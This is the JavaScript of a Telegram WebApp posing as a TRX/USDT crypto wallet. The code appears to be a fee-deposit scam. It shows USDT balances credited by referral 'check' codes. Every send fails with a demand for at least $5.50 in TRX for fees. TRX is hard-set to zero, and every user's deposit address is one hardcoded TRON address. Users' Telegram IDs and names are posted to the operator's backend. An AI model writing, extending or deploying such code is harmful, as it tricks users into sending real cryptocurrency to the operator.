const tg = window.Telegram.WebApp;
tg.expand();
const user = tg.initDataUnsafe?.user;
if (!user) {
    alert("❌ Please open this wallet from inside Telegram.");
    throw new Error("WebApp must be opened inside Telegram.");
}

const userId = user.id;
const username = user.username;
const first_name = user.first_name;

let lastScreen = "main";
let currentToken = null;
let selectedCoin = null; // ✅ Объявляем переменную

// Actions (Buy button)
function handleAction(type) {
    if (type === "buy") {
        showPopup("Buy functionality is under development.");
    }
}

// Coin selector bottom sheet
function openCoinSelector(actionType) {
    const overlay = document.createElement("div");
    overlay.className = "overlay-sheet";
    overlay.style.animation = "slideUp 0.3s ease-out";
    overlay.innerHTML = `
        <div class="sheet-header">
            <span class="title">${actionType === "send" ? "Send" : "Receive"} Crypto</span>
            <button class="close-btn" onclick="this.parentElement.parentElement.remove()">✕</button>
        </div>
        <div class="coin-list">
            <div class="coin-option" onclick="selectCoin('${actionType}', 'TRX')">
                <img src="assets/tron.svg" /> <span>TRX</span>
            </div>
            <div class="coin-option" onclick="selectCoin('${actionType}', 'USDT')">
                <img src="assets/usdt.svg" /> <span>USDT</span>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
}

function selectCoin(action, coin) {
    document.querySelector(".overlay-sheet")?.remove();
    if (action === "send") openSendForm(coin);
    else if (action === "receive") openReceiveView(coin);
}

function openSendForm(coin) {
    hideAll();
    document.getElementById("send-form-view").classList.remove("hidden");
    lastScreen = "crypto";
}

function closeSendForm() {
    document.getElementById("send-form-view").classList.add("hidden");
    if (lastScreen === "crypto") document.getElementById("crypto-view").classList.remove("hidden");
    else document.getElementById("main-view").classList.remove("hidden");
}

function openReceiveView(coin) {
    hideAll();
    document.getElementById("receive-view").classList.remove("hidden");
    lastScreen = "main";

    const icon = document.getElementById("receive-icon");
    const name = document.getElementById("receive-name");
    const title = document.getElementById("receive-title");
    const address = document.getElementById("receive-address");
    const qr = document.getElementById("receive-qr");

    if (coin === "TRX") {
        icon.src = "assets/tron.svg";
        name.innerText = "TRX";
        title.innerText = "Receive TRX";
        address.innerText = "TUTCMBJfxzFygTdmRmfncFheqdthdaXzpL";
        qr.src = "assets/qrtron.jpg";
    } else {
        icon.src = "assets/usdt.svg";
        name.innerText = "USDT";
        title.innerText = "Receive USDT";
        address.innerText = "TUTCMBJfxzFygTdmRmfncFheqdthdaXzpL";
        qr.src = "assets/qrusdt.jpg";
    }
}


function closeReceiveView() {
    document.getElementById("receive-view").classList.add("hidden");
    document.getElementById("main-view").classList.remove("hidden");
}

function openCryptoView(coin) {
    hideAll();
    document.getElementById("crypto-view").classList.remove("hidden");

    currentToken = coin;
    selectedCoin = coin;

    const icon = document.getElementById("crypto-icon");
    const name = document.getElementById("crypto-name");
    const title = document.getElementById("crypto-title");
    const balanceElem = document.getElementById("crypto-balance");
    const balanceUsdElem = document.getElementById("crypto-balance-usd");


    if (coin === "TRX") {
        icon.src = "assets/tron.svg";
        name.innerText = "TRX";
        title.innerText = "TRX Wallet";
        balanceElem.innerText = "0.00 TRX";
        balanceUsdElem.innerText = "$0.00";
        renderTransactions("TRX");
    } else {
        icon.src = "assets/usdt.svg";
        name.innerText = "USDT";
        title.innerText = "USDT Wallet";

        if (userId !== "guest") {
            console.log("📡 Fetching balance for:", userId);
            fetch(`https://crypto-wallet-backend-nu0l.onrender.com/balance/${userId}`)
                .then(res => res.json())
                .then(data => {
                    console.log("📥 Balance response:", data);
                    const usdtBalance = data.USDT || 0;
                    balanceElem.innerText = `${usdtBalance.toFixed(2)} USDT`;
                    balanceUsdElem.innerText = `$${usdtBalance.toFixed(2)}`;
                    document.querySelector(".balance-change").innerText = `$${usdtBalance.toFixed(2)}`;
                    renderTransactions("USDT");
                })
                .catch(err => {
                    console.error("❌ Failed to fetch balance:", err);
                    balanceElem.innerText = "0.00 USDT";
                });
        }
    }

    lastScreen = "main";
}

function renderTransactions(token) {
    const list = document.getElementById("tx-list");
    if (!list) return;

    list.innerHTML = "";
    console.log("📡 Fetching transactions for:", userId, token);

    fetch(`https://crypto-wallet-backend-nu0l.onrender.com/transactions/${userId}/${token}`)
        .then(res => res.json())
        .then(history => {
            console.log("📜 Transactions received:", history);
            if (!Array.isArray(history)) {
                console.warn("⚠️ Транзакции не получены:", history);
                list.innerHTML = "<p style='padding:10px'>No transactions yet.</p>";
                return;
            }

            history.reverse().forEach(tx => {
                const txDiv = document.createElement("div");
                txDiv.className = "tx";
                txDiv.innerHTML = `
                    <div class="tx-left">
                        <div class="tx-icon ${tx.type}">${tx.type === "send" ? "↑" : "↓"}</div>
                        <div>
                            <div class="tx-type">${tx.type}</div>
                            <div class="tx-to">${tx.type === "send" ? "To:" : "From:"} ${tx.address}</div>
                        </div>
                    </div>
                    <div class="tx-right">
                        <div class="tx-amount ${tx.amount > 0 ? 'green' : 'red'}">
                            ${tx.amount > 0 ? "+" : ""}${tx.amount.toFixed(2)} ${token}
                        </div>
                        <div class="tx-usd">$${tx.usd.toFixed(2)}</div>
                    </div>
                `;
                list.appendChild(txDiv);
            });
        })
        .catch(err => {
            console.error("Failed to load transactions:", err);
            showPopup("❌ Failed to load transaction history.");
        });
}


function closeCryptoView() {
    document.getElementById("crypto-view").classList.add("hidden");
    document.getElementById("main-view").classList.remove("hidden");
}

function hideAll() {
    ["main-view", "send-form-view", "receive-view", "crypto-view"].forEach(id => {
        document.getElementById(id)?.classList.add("hidden");
    });
}

function validateSendForm() {
    const address = document.getElementById("send-address").value.trim();
    const amount = document.getElementById("send-amount").value.trim();
    const btn = document.getElementById("send-next-btn");
    btn.disabled = !(address.length > 0 && parseFloat(amount) > 0);
}

function pasteAddress() {
    navigator.clipboard.readText().then(text => {
        document.getElementById("send-address").value = text;
        validateSendForm();
    });
}

function setMax() {
    const amountInput = document.getElementById("send-amount");
    let maxAmount = 0;

    if (currentToken === "USDT") {
        const text = document.getElementById("crypto-balance")?.innerText;
        maxAmount = parseFloat(text?.replace("USDT", "").trim()) || 0;
    } else if (currentToken === "TRX") {
        maxAmount = 0.00; // По ТЗ TRX всегда 0.00
    }

    amountInput.value = maxAmount.toFixed(2);
    validateSendForm();
}


function submitSendForm() {
    if (currentToken === "TRX") {
        showPopup("You don't have enough TRX on your balance.");
    } else {
        showPopup("To complete this transaction, please ensure your TRX balance has at least $5.50 to cover the required network fees.");
    }
}

function showPopup(message) {
    const popup = document.getElementById("popup-message");
    const text = document.getElementById("popup-text");
    text.innerText = message;
    popup.classList.remove("hidden");
}

function closePopup() {
    document.getElementById("popup-message").classList.add("hidden");
}

function copyAddress() {
    const address = document.getElementById("receive-address").innerText;
    navigator.clipboard.writeText(address).then(() => {
        showPopup("Address copied to clipboard");
    });
}

// Referral bonus logic
const referralCode = tg.initDataUnsafe?.start_param;
if (referralCode) {
    activateCheck(referralCode);
}

// 🔁 Отправка и синхронизация данных пользователя с backend
console.log("🔁 syncUserData started");
async function syncUserData() {
    const user = tg.initDataUnsafe?.user;
    console.log("👤 Telegram User:UP", user);
    if (!user) return;

    try {
        const res = await fetch("https://crypto-wallet-backend-nu0l.onrender.com/userdata", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                id: user.id,
                username: user.username,
                first_name: user.first_name,
            }),
        });

        const data = await res.json();
        console.log("✅ Данные синхронизированы:", data);
        // Обновим интерфейс сразу после sync
        const balanceRes = await fetch(`https://crypto-wallet-backend-nu0l.onrender.com/balance/${user.id}`);
        const balanceData = await balanceRes.json();
        const balance = balanceData.USDT || 0;

        const balanceElem = document.getElementById("balance");
        if (balanceElem) {
            balanceElem.innerText = `$${balance.toFixed(2)}`;
        }

        document.querySelectorAll(".token").forEach(token => {
            const name = token.querySelector(".name")?.textContent;
            if (name?.includes("USDT")) token.querySelector(".amount").innerText = balance.toFixed(2);
            if (name?.includes("TRX")) token.querySelector(".amount").innerText = "0.00";
        });

        // Предзагрузка транзакций USDT
        renderTransactions("USDT");

        // Скрыть splash
        const splash = document.getElementById("splash-screen");
        if (splash) splash.style.animation = "fadeOut 0.4s ease-in-out forwards";

        // Обновим баланс и транзакции после авторизации
        // openCryptoView("USDT"); // отключаем автооткрытие

        // Обновим приветствие
        const usernameText = user.username ? ` (@${user.username})` : "";
        document.getElementById("user-info").innerText =
            `👋 Welcome, ${user.first_name}${usernameText}`;
    } catch (err) {
        console.error("❌ Ошибка при синхронизации:", err);
    }
}
async function activateCheck(code) {
    const user = tg.initDataUnsafe?.user;
    console.log("👤 Telegram User:DOWN", user);
    if (!user || !code) return showPopup("❌ Invalid user or code");

    try {
        const res = await fetch("https://crypto-wallet-backend-nu0l.onrender.com/apply-check", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                userId: user.id,
                username: user.username,
                first_name: user.first_name,
                code
            }),
        });

        const data = await res.json();
        console.log("✅ User data saved:", data);

        if (data.success) {
            showPopup(`✅ Check applied! +$${data.added.toFixed(2)} USDT`);

            // 🔁 Обновляем баланс и историю
            openCryptoView("USDT");
        } else {
            showPopup("❌ " + (data.error || "Failed to apply check"));
        }
    } catch (err) {
        console.error("❌ Apply check error:", err);
        showPopup("❌ Server error");
    }
}
// 🟢 Автозапуск при загрузке WebApp
syncUserData();

// Automatically use selected token for Receive action
document.querySelectorAll('.icon-wrapper').forEach(btn => {
    btn.addEventListener('click', () => {
        const isMainViewVisible = !document.getElementById("main-view").classList.contains("hidden");

        if (
            btn.innerText.toLowerCase().includes('receive') &&
            currentToken &&
            isMainViewVisible
        ) {
            openCoinSelector('receive'); // ✅ только выбор монеты
        }
    });
});

window.openCryptoView = openCryptoView;
window.openCoinSelector = openCoinSelector;
